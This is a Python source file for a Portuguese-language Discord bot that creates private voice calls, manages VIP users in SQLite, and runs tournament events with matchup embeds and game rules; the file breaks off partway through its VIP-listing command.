import discord
import asyncio
import sqlite3
from datetime import datetime, timedelta
from discord import app_commands
from discord.ui import Select, View, Button
from discord.utils import get
from discord.ext import commands

id_do_servidor = 881191654130843698  # ID do seu servidor
id_canal_especifico = 1335736129634304051  # ID do canal onde a criação de call privada será acionada

# Variável global para armazenar o ID do canal de criação
id_canal_criacao = None

# UID do dono
DONO_UID = 883771289653899314  # Substitua pelo UID correto

# Configuração dos intents necessários
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True

# Emojis
liberado_emoji = "<:permitido:1336370678118617089>"
proibido_emoji = "<:negado:1336370614688157768>"
regras_livro = "<a:livro:1336371274175479829>"
coroa = "<:coroa:1336370576931164261>"
brilho = "<:brilho:1336371248967581806>"
emoji_aviso = "<:aviso:1336370560082513961>"
bloqueio = "<:bloqueio:1336471528451080292>"
primeiro = "<:1st:1339412176619831447>"
segundo = "<:2nd:1339412184870158399>"
terceiro = "<:3rd:1339412191471996989>"
bomjogo = "<:bomjogo:1339412764480897115>"


class DatabaseManager:
    def __init__(self):
        self.conn = sqlite3.connect('vips.db')
        self.cursor = self.conn.cursor()
        self.setup_database()

    def setup_database(self):
        """Cria as tabelas necessárias no banco de dados."""
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS vips (
                uid TEXT PRIMARY KEY,
                nome TEXT NOT NULL,
                validade TIMESTAMP NOT NULL
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        ''')
        self.conn.commit()

    def add_vip(self, uid: str, nome: str, validade: datetime):
        """Adiciona ou atualiza um VIP no banco de dados."""
        self.cursor.execute('''
            INSERT OR REPLACE INTO vips (uid, nome, validade)
            VALUES (?, ?, ?)
        ''', (uid, nome, validade.isoformat()))
        self.conn.commit()

    def remove_vip(self, uid: str):
        """Remove um VIP do banco de dados."""
        self.cursor.execute('DELETE FROM vips WHERE uid = ?', (uid,))
        self.conn.commit()

    def get_all_vips(self):
        """Retorna todos os VIPs."""
        self.cursor.execute('SELECT * FROM vips')
        return self.cursor.fetchall()

    def is_vip(self, user_id: str):
        """Verifica se um usuário é VIP e se ainda está válido."""
        self.cursor.execute('SELECT validade FROM vips WHERE uid = ?', (user_id,))
        result = self.cursor.fetchone()
        if result:
            validade = datetime.fromisoformat(result[0])
            return validade > datetime.now()
        return False

    def set_setting(self, key: str, value: str):
        """Define uma configuração no banco de dados."""
        self.cursor.execute('''
            INSERT OR REPLACE INTO settings (key, value)
            VALUES (?, ?)
        ''', (key, value))
        self.conn.commit()

    def get_setting(self, key: str):
        """Obtém uma configuração do banco de dados."""
        self.cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
        result = self.cursor.fetchone()
        return result[0] if result else None


class Client(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)

        # Inicialização das propriedades do bot
        self.synced = False
        self.temp_roles = {}  # Armazena informações sobre as calls privadas
        self.tree = app_commands.CommandTree(self)

        # Inicializando o gerenciador do banco de dados
        try:
            self.db = DatabaseManager()
            print("Banco de dados inicializado com sucesso.")
        except Exception as e:
            print(f"Erro ao inicializar o banco de dados: {e}")

    def is_vip_or_owner(self, user: discord.User) -> bool:
        """
        Verifica se o usuário é VIP ou o dono do bot.

        :param user: O usuário a ser verificado.
        :return: True se for VIP ou dono, False caso contrário.
        """
        if user.id == DONO_UID:
            return True  # O dono do bot sempre tem permissão
        return self.db.is_vip(str(user.id))  # Verifica se o usuário é VIP no banco de dados

    async def on_ready(self):
        """Evento chamado quando o bot está pronto para uso."""
        await self.wait_until_ready()

        if not self.synced:
            try:
                await self.tree.sync()
                print("Comandos sincronizados com sucesso!")
            except Exception as e:
                print(f"Erro ao sincronizar comandos: {e}")
            self.synced = True

        print(f"Bot conectado como {self.user}.")

    async def on_voice_state_update(self, member: discord.Member, before: discord.VoiceState,
                                    after: discord.VoiceState):
        """
        Evento chamado sempre que um membro muda seu estado de voz.

        - `before`: Estado anterior do membro.
        - `after`: Novo estado do membro.
        """

        # Verifica se o membro entrou no canal base para criação de calls privadas
        if after.channel is not None:
            id_canal_criacao = self.db.get_setting("id_canal_criacao")

            if id_canal_criacao is None:
                return

            if str(after.channel.id) == id_canal_criacao:
                await self.criar_call_privada(member)

        # Verifica se o membro saiu de uma call privada
        if before.channel is not None and before.channel.id in [data['channel'].id for data in
                                                                self.temp_roles.values()]:
            await asyncio.sleep(30)  # Aguarda 30 segundos

            # Verifica novamente se a call está vazia
            if len(before.channel.members) == 0:
                for channel_name, data in list(self.temp_roles.items()):
                    if data['channel'].id == before.channel.id:
                        # Apaga o canal e o cargo associados à call privada
                        await data['channel'].delete(reason="Canal privado vazio por 30 segundos.")
                        await data['role'].delete(reason="Cargo temporário associado ao canal privado.")
                        del self.temp_roles[channel_name]  # Remove da lista temporária
                        print(f"Call privada '{channel_name}' e cargo deletados devido à inatividade.")

    async def criar_call_privada(self, member: discord.Member):
        """
        Cria uma call privada para o membro que entrou no canal definido.

        - `member`: Membro que solicitou a criação da call privada.
        """

        guild = member.guild
        channel_name = member.display_name

        id_canal_criacao = self.db.get_setting("id_canal_criacao")

        if id_canal_criacao is None:
            await member.send(f"{proibido_emoji} O canal de criação não foi definido.")
            return

        canal_criacao = discord.utils.get(guild.voice_channels, id=int(id_canal_criacao))

        if not canal_criacao:
            await member.send(f"{proibido_emoji} O canal de criação não existe.")
            return

        category = canal_criacao.category

        if not category:
            await member.send(f"{proibido_emoji} O canal de criação não tem uma categoria associada.")
            return

        existing_channel = discord.utils.get(category.voice_channels, name=channel_name)

        if existing_channel:
            await member.move_to(existing_channel)
            return

        role = await guild.create_role(name=channel_name, reason="Cargo temporário para call privada")
        await member.add_roles(role)

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(connect=False),
            role: discord.PermissionOverwrite(connect=True, manage_channels=True, view_channel=True)
        }

        new_channel = await guild.create_voice_channel(
            name=channel_name,
            category=category,
            overwrites=overwrites
        )

        await member.move_to(new_channel)

        embed = discord.Embed(
            title="Dar cargo",
            description="Mencione o usuário que você quer que tenha acesso à sua call privada.",
            color=0x4B0082
        )

        await new_channel.send(embed=embed)

        # Armazena informações sobre a call criada
        self.temp_roles[channel_name] = {
            'role': role,
            'creator': member,
            'created_at': datetime.now(),
            'channel': new_channel
        }

    async def on_message(self, message):
        """
        Evento chamado sempre que uma mensagem é enviada em um canal.

        - Atribui cargos aos usuários mencionados pelo dono da call privada.
        """

        for channel_name, data in self.temp_roles.items():
            if message.channel == data['channel'] and message.author == data['creator']:
                mentioned_users = message.mentions  # Usuários mencionados pelo dono da call

                if not mentioned_users:
                    return  # Se não houver menções, não faz nada

                for user in mentioned_users:
                    role = data['role']
                    try:
                        await user.add_roles(role)

                        # Envia mensagem de confirmação
                        confirmation_message = await message.channel.send(
                            f"{liberado_emoji} {user.mention} agora tem acesso à sua call privada."
                        )

                        # Apaga a mensagem de confirmação após 5 segundos
                        await confirmation_message.delete(delay=5)

                    except discord.Forbidden:
                        await message.channel.send(
                            f"{proibido_emoji} Não consegui atribuir o cargo para {user.mention}. Verifique minhas permissões.",
                            delete_after=5
                        )

                # Apaga a mensagem original após 5 segundos
                await message.delete(delay=5)


# Inicialização do cliente e configuração do comando /setarcall
aclient = Client()


@aclient.tree.command(
    name="setarcall",
    description="Define qual canal será utilizado para criar as calls privadas."
)
async def setar_call(interaction: discord.Interaction, canal: discord.VoiceChannel):
    aclient.db.set_setting("id_canal_criacao", str(canal.id))

    await interaction.response.send_message(
        f"{liberado_emoji} O canal de criação foi definido como: {canal.mention}",
        ephemeral=True  # Mensagem visível apenas para quem usou o comando.
    )


# Comando para criar uma call privada
@aclient.tree.command(
    name='criarcall',
    description='Cria uma call privada'
)
async def criar_call(interaction: discord.Interaction):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    guild = interaction.guild
    channel_name = interaction.user.display_name

    # Verificando se o canal de criação está definido
    if id_canal_criacao is None:
        await interaction.response.send_message(
            f"{proibido_emoji} O canal de criação não foi definido. Use o comando /setarcall para definir um canal.",
            ephemeral=True)
        return

    # Obtendo o canal de criação
    canal_criacao = discord.utils.get(guild.voice_channels, id=id_canal_criacao)

    # Verificando se o canal de criação existe
    if not canal_criacao:
        await interaction.response.send_message(
            f"{proibido_emoji} O canal de criação não existe. Verifique se o canal definido está correto.",
            ephemeral=True)
        return

    # Obtendo a categoria do canal de criação
    category = canal_criacao.category

    # Verificando se a categoria foi encontrada
    if not category:
        await interaction.response.send_message(
            f"{proibido_emoji} O canal de criação não tem uma categoria associada. Defina um canal válido com categoria.",
            ephemeral=True)
        return

    # Verificando se já existe um canal com o mesmo nome
    existing_channel = discord.utils.get(category.voice_channels, name=channel_name)
    if existing_channel:
        await interaction.response.send_message(f"Já existe uma call privada com o nome {channel_name}.",
                                                ephemeral=True)
        return

    # Criando o cargo para o membro
    role = await guild.create_role(name=channel_name, reason="Cargo temporário para call privada")
    await interaction.user.add_roles(role)

    # Criando o novo canal de voz dentro da categoria do canal de criação
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(connect=False),
        role: discord.PermissionOverwrite(connect=True, manage_channels=True, view_channel=True)
    }

    new_channel = await guild.create_voice_channel(
        name=channel_name,
        category=category,
        overwrites=overwrites
    )

    # Enviando um embed para o novo canal
    embed = discord.Embed(
        title="Dar cargo",
        description="Mencione o usuário que você quer que tenha acesso à sua call privada.",
        color=0x4B0082
    )
    await new_channel.send(embed=embed)

    await interaction.response.send_message(f"Call privada {channel_name} criada com sucesso!", ephemeral=True)

    aclient.temp_roles[channel_name] = {
        'role': role,
        'creator': interaction.user,
        'created_at': datetime.now(),
        'channel': new_channel
    }

    await interaction.user.move_to(new_channel)


# Adicionando o botão para o comando de confronto
@aclient.tree.command(
    name="confronto",
    description="Cria um confronto entre dois times"
)
@app_commands.describe(
    time1="Mencione o cargo do primeiro time.",
    time2="Mencione o cargo do segundo time.",
    id="ID do confronto.",
    senha="Senha do confronto."
)
async def confronto(interaction: discord.Interaction, time1: discord.Role, time2: discord.Role, id: str, senha: str):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):  # Use 'interaction.client'
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    if not time1 or not time2 or not id.strip() or not senha.strip():
        await interaction.response.send_message(f"{proibido_emoji} Todos os campos são obrigatórios!", ephemeral=True)
        return

    if time1 == time2:
        await interaction.response.send_message(f"{proibido_emoji} Os dois times não podem ser o mesmo cargo.",
                                                ephemeral=True)
        return

    emoji_vs = "<:versus:1336370706593616043>"
    emoji_star = "<:estrela:1336371257842733117>"
    emoji_gg = "<:gg:1336371262523703509>"

    thumbnail_url = "https://cdn.discordapp.com/avatars/710114714306478130/a_181e57144058c56f5e88f69568635c49.gif?size=4096"

    embed = discord.Embed(
        title=f"{emoji_star}ㅤCONFRONTOㅤ{emoji_star}",
        description=f"**{time1.mention}**ㅤ{emoji_vs}ㅤ**{time2.mention}**\n\n**ID:** {id}\n**Senha:** {senha}",
        color=0xFFFF00
    )
    embed.set_thumbnail(url=thumbnail_url)

    # Criando o botão para copiar ID
    button = discord.ui.Button(label="Copiar ID", style=discord.ButtonStyle.green)

    async def button_callback(interaction: discord.Interaction):
        await interaction.response.send_message(f"{id}", ephemeral=True)

    button.callback = button_callback

    # Criando o menu de seleção
    select = discord.ui.Select(
        placeholder="Definir vencedor",
        options=[
            discord.SelectOption(label=time1.name, value="time1", description=f"Definir {time1.name} como vencedor"),
            discord.SelectOption(label=time2.name, value="time2", description=f"Definir {time2.name} como vencedor"),
        ]
    )

    async def select_callback(interaction: discord.Interaction):
        if interaction.user.id != interaction.message.interaction.user.id:
            await interaction.response.send_message(
                f"{proibido_emoji} Apenas o criador do confronto pode definir o vencedor!",
                ephemeral=True)
            return

        vencedor = time1 if select.values[0] == "time1" else time2

        for field in embed.fields:
            if "Vencedor" in field.name:
                embed.set_field_at(embed.fields.index(field), name=f"{emoji_gg}ㅤVencedor", value=vencedor.mention,
                                   inline=False)
                await interaction.message.edit(embed=embed)
                await interaction.response.send_message(
                    f"{liberado_emoji} O time {vencedor.mention} foi atualizado como vencedor!",
                    ephemeral=True)
                return

        embed.add_field(name=f"{emoji_gg}ㅤVencedor", value=vencedor.mention, inline=False)
        await interaction.message.edit(embed=embed)
        await interaction.response.send_message(
            f"{liberado_emoji} O time {vencedor.mention} foi marcado como vencedor!",
            ephemeral=True)

    select.callback = select_callback

    # Criando a view e adicionando o botão e o menu
    view = discord.ui.View(timeout=None)  # Timeout indefinido
    view.add_item(select)
    view.add_item(button)

    # Enviando a mensagem com o embed e a view
    message = await interaction.response.send_message(embed=embed, view=view)

    # Salvando o ID da mensagem no banco de dados
    try:
        message_id = (await message.original_response()).id  # Obtém o ID da mensagem enviada
        aclient.db.set_setting(f"confronto_{id}", str(message_id))
        print(f"ID da mensagem ({message_id}) armazenado no banco de dados para o confronto {id}.")
    except Exception as e:
        print(f"Erro ao salvar o ID da mensagem no banco de dados: {e}")


# Comando para adicionar/remover cargos de usuários
@aclient.tree.command(
    name='cargo',
    description='Adiciona ou remove um cargo de um membro.'
)
@app_commands.describe(
    cargo="Mencione o cargo que deseja adicionar/remover.",
    membro="Opcional: mencione o membro que receberá/removerá o cargo. Padrão: você mesmo."
)
async def cargo(interaction: discord.Interaction, cargo: discord.Role, membro: discord.Member = None):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    # Verificando se o usuário tem permissão para gerenciar cargos
    if not interaction.user.guild_permissions.manage_roles:
        await interaction.response.send_message(f"{bloqueio} Você não tem permissão para gerenciar cargos.",
                                                ephemeral=True)
        return

    # Verificando se o bot tem permissão para gerenciar cargos
    if not interaction.guild.me.guild_permissions.manage_roles:
        await interaction.response.send_message(f"{bloqueio} Eu não tenho permissão para gerenciar cargos.",
                                                ephemeral=True)
        return

    # Se não for informado um membro, o comando será executado para o próprio usuário
    membro = membro or interaction.user

    # Verificando se o cargo do usuário está abaixo do cargo do bot
    cargo_mais_alto_usuario = max(interaction.user.roles, key=lambda r: r.position)

    # Verifica se o usuário é o dono, se não for, aplica a verificação normal de hierarquia
    if interaction.user.id != DONO_UID:
        if cargo.position >= cargo_mais_alto_usuario.position:
            await interaction.response.send_message(
                f"{bloqueio} Você não pode atribuir ou remover um cargo acima do seu nível.",
                ephemeral=True)
            return

    # Verificando se o cargo do bot está abaixo do cargo que está sendo atribuído/removido
    if cargo.position >= interaction.guild.me.top_role.position:
        await interaction.response.send_message(
            f"{bloqueio} O cargo que você está tentando adicionar/remover é superior ao meu.",
            ephemeral=True)
        return

    # Adicionando ou removendo o cargo
    if cargo in membro.roles:
        await membro.remove_roles(cargo, reason=f"Removido pelo comando /cargo por {interaction.user}.")
        await interaction.response.send_message(
            f"{proibido_emoji} O cargo {cargo.mention} foi removido de {membro.mention}.",
            ephemeral=True)
    else:
        await membro.add_roles(cargo, reason=f"Adicionado pelo comando /cargo por {interaction.user}.")
        await interaction.response.send_message(
            f"{liberado_emoji} O cargo {cargo.mention} foi adicionado a {membro.mention}.",
            ephemeral=True)


@aclient.tree.command(
    name="evento",  # Nome do comando
    description="Cria um evento com categoria e canais."
)
@app_commands.describe(nome="Nome da categoria do evento.")
async def evento_criar(interaction: discord.Interaction, nome: str):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    # Verificando se a categoria já existe
    existing_category = discord.utils.get(interaction.guild.categories, name=nome)
    if existing_category:
        await interaction.response.send_message(f"{proibido_emoji} Já existe um evento com o nome '{nome}'.",
                                                ephemeral=True)
        return

    try:
      
        category = await interaction.guild.create_category(nome)
                # Definindo as permissões para o @everyone
        overwrites = {
            interaction.guild.default_role: discord.PermissionOverwrite(send_messages=False)
        }
        
        # Criando os canais dentro da categoria com as permissões configuradas apenas para esses canais
        await interaction.guild.create_text_channel("📕・regras", category=category,overwrites=overwrites)
        await interaction.guild.create_text_channel("🍀・confrontos", category=category, overwrites=overwrites)
        await interaction.guild.create_text_channel("🚧・avisos", category=category, overwrites=overwrites)
        await interaction.guild.create_text_channel("🧷・cargos", category=category, overwrites=overwrites)

        await interaction.response.send_message(f"{liberado_emoji} Evento '{nome}' criado com sucesso!", ephemeral=True)

    except Exception as e:
        await interaction.response.send_message(f"{proibido_emoji} Ocorreu um erro ao criar o evento: {str(e)}",
                                                ephemeral=True)

@aclient.tree.command(
    name="formular",
    description="Cria cargos e calls para os times dentro da categoria do evento."
)
@app_commands.describe(
    nome="Nome da categoria do evento.",
    times="Lista de nomes dos times (adicione vários separados por espaço)."
)
async def formular(interaction: discord.Interaction, nome: str, times: str):
    # Resposta inicial para garantir que a interação não expire
    await interaction.response.defer(ephemeral=True)

    # Verificando se o usuário tem VIP ou é dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.followup.send(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser VIP ou tirar suas dúvidas, entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True
        )
        return

    guild = interaction.guild

    # Verificando se a categoria existe
    category = discord.utils.get(guild.categories, name=nome)
    if not category:
        await interaction.followup.send(
            f"{proibido_emoji} A categoria '{nome}' não foi encontrada. Certifique-se de digitar corretamente.",
            ephemeral=True
        )
        return

    # Processando os nomes dos times separados por vírgula
    team_names = [team.strip() for team in times.split(",") if team.strip()]
    
    if not team_names:
        await interaction.followup.send(
            "❌ Nenhum nome de time válido foi detectado. Certifique-se de adicionar pelo menos um time.",
            ephemeral=True
        )
        return

    created_roles = []
    created_channels = []

    for team_name in team_names:
        prefixed_name = f"⭐・{team_name}"

        # Verificando se o cargo já existe
        role = discord.utils.get(guild.roles, name=prefixed_name)
        if not role:
            try:
                role = await guild.create_role(name=prefixed_name, mentionable=True)
            except discord.Forbidden:
                await interaction.followup.send(
                    f"❌ Não tenho permissão para criar o cargo '{prefixed_name}'.",
                    ephemeral=True
                )
                continue

        created_roles.append(role)

        # Criando o canal de voz com permissões
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(connect=False),  # Bloqueia todos
            role: discord.PermissionOverwrite(connect=True)  # Permite apenas o time
        }

        # Verificando se o canal já existe
        voice_channel = discord.utils.get(category.voice_channels, name=prefixed_name)
        if not voice_channel:
            try:
                voice_channel = await guild.create_voice_channel(
                    name=prefixed_name,
                    category=category,
                    overwrites=overwrites
                )
            except discord.Forbidden:
                await interaction.followup.send(
                    f"❌ Não tenho permissão para criar a call '{prefixed_name}'.",
                    ephemeral=True
                )
                continue

        created_channels.append(voice_channel)

    # Após o processamento de todos os cargos e canais, envia a resposta final
    await interaction.followup.send(
        f"{liberado_emoji} Foram criados **{len(created_roles)}** cargos e calls na categoria '{nome}' com o prefixo '⭐ · '.",
        ephemeral=True
    )  
      
# Comando para finalizar o evento
@aclient.tree.command(
    name="finalizar",
    description="Finaliza um evento, removendo a categoria, seus canais e cargos relacionados."
)
@app_commands.describe(nome="Nome da categoria do evento.")
async def evento_finalizar(interaction: discord.Interaction, nome: str):
    await interaction.response.defer(ephemeral=True)  # Evita erro de timeout
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):  # Use 'interaction.client'
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    guild = interaction.guild

    category = discord.utils.get(guild.categories, name=nome)
    if not category:
        await interaction.followup.send(f"{proibido_emoji} Não existe um evento com o nome '{nome}'.", ephemeral=True)
        return

    # Excluindo todos os canais dentro da categoria
    calls_names = [channel.name for channel in category.channels if isinstance(channel, discord.VoiceChannel)]
    for channel in category.channels:
        await channel.delete()

    # Excluindo a categoria
    await category.delete()

    # Excluindo os cargos relacionados
    roles_to_delete = [role for role in guild.roles if role.name == nome]
    roles_to_delete.extend([role for role in guild.roles if role.name in calls_names])

    for role in roles_to_delete:
        await role.delete()

    await interaction.followup.send(f"{liberado_emoji} Evento '{nome}' finalizado e removido com sucesso!",
                                    ephemeral=True)


# Comando de regras
@aclient.tree.command(
    name="regras",
    description="Exibe as regras do evento"
)
@app_commands.describe(opcao="Escolha as regras do evento: x2, x4 ou mapa aberto.",
                       nome="(Opcional) Nome personalizado para o título das regras")
async def regras(interaction: discord.Interaction, opcao: str, nome: str = None):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):
        await interaction.response.send_message(f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.",
                                                ephemeral=True)
        return

    if opcao.lower() == "x4":
        titulo = f"{coroa}ㅤREGRAS - CONTRA SQUAD"
        if nome:
            titulo += f" - {nome}"

        embed = discord.Embed(
            title=titulo,
            description="",
            color=0xFFFF00
        )
        # REGRAS GERAIS
        embed.add_field(
            name=f"{regras_livro}ㅤREGRAS GERAIS",
            value=(
                "\nReplay obrigatório estar ativado;\n"
                "Proibido arma upada (lv 1,2 e 3)\n"
                "Obrigatório todos os players em suas respectivas calls"
            ),
            inline=False
        )

        # PERSONAGENS PERMITIDOS
        embed.add_field(
            name=f"{brilho}ㅤPERSONAGENS PERMITIDOS",
            value=(
                f"\n{liberado_emoji}ㅤAlok\n"
                f"{liberado_emoji}ㅤMoco\n"
                f"{liberado_emoji}ㅤKelly\n"
                f"{liberado_emoji}ㅤLaura\n"
                f"{liberado_emoji}ㅤMaxim\n"
                f"{liberado_emoji}ㅤLeon\n"

            ),
            inline=False
        )

        # PETS PROIBIDOS
        embed.add_field(
            name=f"{brilho}ㅤPETS PROIBIDOS",
            value=
            f"\n{proibido_emoji}ㅤDrakinho\n"
            f"{proibido_emoji}ㅤEtzin",

            inline=False
        )

        # PERSONAGENS/ARMAS PERMITIDOS
        embed.add_field(
            name=f"{brilho}ㅤPERSONAGENS/ARMAS PERMITIDOS",
            value=(
                f"\n{liberado_emoji}ㅤSomente Alok de ativa;\n"
                f"{liberado_emoji}ㅤMini Uzi e Desert somente no 1° round;\n"
                f"{liberado_emoji}ㅤXm8;\n"
                f"{liberado_emoji}ㅤUmp;\n"
            ),
            inline=False
        )

    elif opcao.lower() == "x2":
        titulo = f"{coroa}ㅤREGRAS - X2"
        if nome:
            titulo += f" - {nome}"

        embed = discord.Embed(
            title=titulo,
            description="",
            color=0xFFFF00
        )

        # REGRAS GERAIS
        embed.add_field(
            name=f"{regras_livro}ㅤREGRAS GERAIS",
            value=(
                "\nReplay obrigatório estar ativado;\n"
                "Proibido arma upada (lv 1,2 e 3)\n"
                "Obrigatório todos os players em suas respectivas calls"
            ),
            inline=False
        )

        # PERSONAGENS PERMITIDOS
        embed.add_field(
            name=f"{brilho}ㅤPERSONAGENS PERMITIDOS",
            value=(
                f"\n{liberado_emoji}ㅤAlok\n"
                f"{liberado_emoji}ㅤMoco\n"
                f"{liberado_emoji}ㅤKelly\n"
                f"{liberado_emoji}ㅤLaura\n"
                f"{liberado_emoji}ㅤMaxim\n"
                f"{liberado_emoji}ㅤLeon\n"

            ),
            inline=False
        )

        # PETS PROIBIDOS
        embed.add_field(
            name=f"{brilho}ㅤPETS PROIBIDOS",
            value=(
                f"\n{proibido_emoji}ㅤDrakinho\n"
                f"{proibido_emoji}ㅤEtzin"
            ),
            inline=False
        )

        # PERSONAGENS/ARMAS PERMITIDOS
        embed.add_field(
            name=f"{brilho}ㅤPERSONAGENS/ARMAS PERMITIDOS",
            value=(
                f"\n{liberado_emoji}ㅤSomente Alok de ativa;\n"
                f"{liberado_emoji}ㅤMini Uzi e Desert somente no 1° round;\n"
                f"{liberado_emoji}ㅤXm8;\n"
                f"{liberado_emoji}ㅤUmp;\n"
            ),
            inline=False
        )

    elif opcao.lower() == "mapa aberto":
        titulo = f"{coroa}ㅤMAPA ABERTO"
        if nome:
            titulo += f"{coroa} - {nome}"

        embed = discord.Embed(
            title=titulo,
            description="",
            color=0xFFFF00
        )

        # REGRAS GERAIS
        embed.add_field(
            name=f"{regras_livro}ㅤREGRAS GERAIS",
            value=(
                "Replay obrigatório estar ativado;\n"
                "Obrigatório todos os players em suas respectivas calls"
            ),
            inline=False
        )

        # PERSONAGENS PERMITIDOS
        embed.add_field(
            name=f"{brilho}ㅤPERSONAGENS PERMITIDOS",
            value=(
                f"\n{liberado_emoji}ㅤTodos os personagens são permitidos\n"
            ),
            inline=False
        )

        # ARMAS PERMITIDAS
        embed.add_field(
            name=f"{brilho}ㅤARMAS PERMITIDAS",
            value=(
                f"\n{liberado_emoji}ㅤTodas as armas são permitidas\n"
            ),
            inline=False
        )

    else:
        await interaction.response.send_message(
            f"{proibido_emoji} Opção inválida. Escolha entre: `x2`, `x4`, ou `mapa aberto`.",
            ephemeral=True)
        return

    await interaction.response.send_message(embed=embed)


# Comando para enviar um aviso com embed personalizado
@aclient.tree.command(
    name="aviso",
    description="Envia um aviso com embed personalizado."
)
@app_commands.describe(titulo="Título do aviso.", mensagem="Mensagem do aviso.")
async def aviso(interaction: discord.Interaction, titulo: str, mensagem: str):
    # Verificando se o usuário tem VIP ou é o dono
    if not interaction.client.is_vip_or_owner(interaction.user):  # Use 'interaction.client'
        await interaction.response.send_message(
            f"{proibido_emoji} Você precisa ser VIP para utilizar este comando.\nPara ser vip ou tirar suas dúvidas entre em contato com meu dono: (61) 98112-5850.",
            ephemeral=True)
        return

    # Verificando se o título e a mensagem foram fornecidos
    if not titulo or not mensagem:
        await interaction.response.send_message(f"{proibido_emoji} O título e a mensagem são obrigatórios!",
                                                ephemeral=True)
        return

        # Usando o ID do emoji que foi carregado no bot
    emoji_aviso = "<:aviso:1336370560082513961>"

    # Obtendo a imagem do servidor (thumbnail) e a foto de perfil do usuário (author icon)
    thumbnail_url = interaction.guild.icon.url if interaction.guild.icon else aclient.user.avatar.url
    author_icon_url = interaction.user.avatar.url if interaction.user.avatar else None

    # URL da imagem fornecida para o embed
    image_url = "https://www.imagensanimadas.com/data/media/134/linha-divisoria-imagem-animada-0258.gif"

    # Criando o embed
    embed = discord.Embed(
        title=f"{emoji_aviso} {titulo}",
        description=mensagem,
        color=0xFFFF00
    )

    # Adicionando a imagem, thumbnail e autor
    embed.set_thumbnail(url=thumbnail_url)
    embed.set_image(url=image_url)
    embed.set_author(name=interaction.user.name, icon_url=author_icon_url)

    # Enviando o embed no canal onde o comando foi utilizado
    await interaction.response.send_message(embed=embed)


@aclient.tree.command(
    name="setarvip",
    description="Define um usuário como VIP por um período específico."
)
@app_commands.describe(uid="UID do usuário a ser definido como VIP.", periodo="Período em dias.")
async def setar_vip(interaction: discord.Interaction, uid: str, periodo: int):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{bloqueio} Apenas o meu dono pode usar este comando.", ephemeral=True)
        return

    # Obtendo o membro pelo UID
    member = interaction.guild.get_member(int(uid))
    if member is None:
        await interaction.response.send_message(
            f"{proibido_emoji} Não foi possível encontrar um usuário com UID {uid}.", ephemeral=True)
        return

    # Calcula a data de validade
    validade = datetime.now() + timedelta(days=periodo)

    # Adiciona ao banco de dados
    aclient.db.add_vip(uid, member.display_name, validade)

    await interaction.response.send_message(
        f"{liberado_emoji} O usuário {member.display_name} (UID: {uid}) foi definido como VIP por {periodo} dias.",
        ephemeral=True
    )


@aclient.tree.command(name="testar_vip")
async def testar_vip(interaction: discord.Interaction):
    is_vip = interaction.client.is_vip_or_owner(interaction.user)
    await interaction.response.send_message(
        f"Você {'é' if is_vip else 'não é'} VIP/Dono.\n"
        f"Seu ID: {interaction.user.id}\n"
        f"DONO_UID: {DONO_UID}",
        ephemeral=True
    )


@aclient.tree.command(
    name="removervip",
    description="Remove um usuário da lista de VIPs."
)
@app_commands.describe(uid="UID do usuário a ser removido.", membro="Mencione o usuário a ser removido.")
async def remover_vip(interaction: discord.Interaction, uid: str = None, membro: discord.Member = None):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{bloqueio} Apenas o meu dono pode usar este comando.", ephemeral=True)
        return

    if uid is None and membro is not None:
        uid = str(membro.id)

    if uid is None:
        await interaction.response.send_message(f"{proibido_emoji} Você deve fornecer um UID ou mencionar um usuário.",
                                                ephemeral=True)
        return

    # Remove o VIP do banco de dados
    aclient.db.remove_vip(uid)
    await interaction.response.send_message(f"{liberado_emoji} O usuário com UID {uid} foi removido da lista de VIPs.",
                                            ephemeral=True)


@aclient.tree.command(
    name="listarvips",
    description="Lista todos os usuários VIP e o tempo restante."
)
async def listar_vips(interaction: discord.Interaction):
    if interaction.user.id != DONO_UID:
        await interaction.response.send_message(f"{bloqueio} Apenas o meu dono pode usar este comando.", ephemeral=True)
        return

    embed = discord.Embed(
        title="Lista de Usuários VIP",
        color=0x00FF00
    )

    vips = aclient.db.get_all_vips()
    if not vips:
        embed.description = "Não há usuários VIP definidos."
    else:
        for uid, nome, validade_str in vips:
            validade = datetime.fromisoformat(validade_str)
            time_remaining = validade - datetime.now()
